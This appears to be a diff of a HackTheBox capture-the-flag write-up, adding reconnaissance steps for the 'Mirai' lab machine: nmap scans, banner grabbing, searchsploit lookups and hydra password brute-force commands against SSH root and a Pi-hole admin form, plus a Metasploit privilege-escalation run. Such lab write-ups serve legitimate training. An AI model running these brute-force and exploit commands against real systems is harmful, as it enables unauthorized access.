@@ -1,8 +1,8 @@
 *HackTheBox*narrative
 Registration
     The first challenge is to register on the site.
-    The page for the registration is https://www.hackthebox.eu/en/invite where there is a form to submit an invite code.
-    In the landing page, we can see and interesting JS library loaded: https://www.hackthebox.eu/js/inviteapi.min.js. The code is obfuscated, we can use any online beautifier and it unpacks to the following code:
+    The registration page is https://www.hackthebox.eu/en/invite where there is a form to submit an invite code.
+    In the landing page code, we can see and interesting JS library loaded: https://www.hackthebox.eu/js/inviteapi.min.js. The code is obfuscated, we can use any online beautifier and it unpacks to the following code:
     *function verifyInviteCode(code) {
     var formData = {
         "code": code
@@ -268,3 +268,85 @@ msf exploit(ms16_032_secondary_logon_handle_privesc) > run
 [*] Compressing script contents...
 [+] Compressed size: 3596
 [*] Executing exploit script...*
+
+
+Mirai 10.10.10.48
+    Reconnaissance. We apply our methodology, first quick syn port scan:
+    *root@kali:~# sudo nmap -vv -T5 -sS 10.10.10.48
+Host is up, received echo-reply ttl 63 (0.037s latency).
+Scanned at 2017-09-03 08:53:09 BST for 2s
+Not shown: 997 closed ports
+Reason: 997 resets
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+53/tcp open  domain  syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63*
+
+    There is a SSH, DNS and HTTP services, next step is to fingerprint them:
+    *# nmap -A 10.10.10.48 -p 22,53,80
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
+| ssh-hostkey:
+|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)
+|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)
+|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)
+|_  256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (EdDSA)
+53/tcp open  domain  dnsmasq 2.76
+| dns-nsid:
+|_  bind.version: dnsmasq-2.76
+80/tcp open  http    lighttpd 1.4.35
+|_http-server-header: lighttpd/1.4.35
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).*
+
+    Let's try to see what the web server is serving:
+    *# nc -vvv 10.10.10.48 80
+10.10.10.48: inverse host lookup failed: Unknown host
+(UNKNOWN) [10.10.10.48] 80 (http) open
+GET / HTTP/1.0
+Connection close
+
+HTTP/1.1 404 Not Found
+X-Pi-hole: A black hole for Internet advertisements.
+Content-type: text/html; charset=UTF-8
+Content-Length: 0
+Connection: close
+Date: Sun, 03 Sep 2017 08:33:08 GMT
+Server: lighttpd/1.4.35*
+
+    We immediately spot the non standard X-Pi-hole header, which points out that the server is likely running the service Pi Hole, which drops DNS requests of known advertisement sites.
+    We an look now at the DNS server.
+
+    *root@kali:~# dig @10.10.10.48 google.com
+
+; <<>> DiG 9.10.3-P4-Debian <<>> @10.10.10.48 google.com
+; (1 server found)
+;; global options: +cmd
+;; connection timed out; no servers could be reached*
+
+    Same problem, the server does not respond. The SSH server is the only one we can successfully connect:
+
+    *# ssh 10.10.10.48
+The authenticity of host '10.10.10.48 (10.10.10.48)' can't be established.
+ECDSA key fingerprint is SHA256:UkDz3Z1kWt2O5g2GRlullQ3UY/cVIx/oXtiqLPXiXMY.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '10.10.10.48' (ECDSA) to the list of known hosts.
+root@10.10.10.48's password: *
+
+    Vulnerability Scanning. First, we look for low hanging fruit, we look for know vulnerabilities of: *dnsmasq-2.76*, *lighttpd/1.4.35*, and *OpenSSH6.7p1*.
+    In Kali linux, we can do:
+    *$ msfconsole
+> search lighttpd*
+    And also:
+    *$ searchsploit lighthttp*
+    Unfortunately, we don't find any exploit. Since we might have to spend some time to find an exploitation mechanism, we run a password bruteforce attack on background, in case we get an easy win:
+
+    *$ hydra -l root -P  /usr/share/wordlists/metasploit/password.lst 10.10.10.48 ssh*
+
+    Let's focus known on the applications, Pi Hole. The official page for documentation is *https://pi-hole.net/*. We quickly spot that the admin page is available at */admin*. Making a request to it serves an admin panel. There is a login form, but it appears that there are no default credentials and that the password has to be set at setup time. We can run a bruteforce attack anyway:
+    *$ hydra -l foo -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.10.10.48 http-post-form "/admin/index.php?login:pw=^PASS^&^USER^:wrong"*
+
+    On the main page, the product version is displayed, we can search if it is up to date:
+    * Pi-hole Version v3.1.4 Web Interface Version v3.1 FTL Version v2.10
+Donate if you found this useful.*
+    On github, we can see it is the very last release at the time of doing the write up https://github.com/pi-hole/pi-hole/releases. So it is the web interface.
+
